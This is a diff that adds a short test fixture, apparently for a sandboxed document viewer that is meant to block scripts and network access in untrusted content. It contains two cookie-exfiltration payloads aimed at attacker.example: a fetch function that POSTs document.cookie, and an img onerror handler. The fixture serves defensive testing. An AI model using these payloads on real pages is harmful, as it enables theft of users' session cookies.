@@ -1,0 +1,14 @@
+# Untrusted executable content
+
+export const exfiltrate = () => fetch('https://attacker.example/collect', {
+  method: 'POST',
+  body: document.cookie,
+})
+
+This document contains executable code. Opening it must not run anything:
+the WebView is loaded from an opaque `data:` origin under a CSP that blocks
+both scripts and all network access until the user explicitly trusts it.
+
+<img src="x" onerror="fetch('https://attacker.example/' + document.cookie)" />
+
+{exfiltrate()}
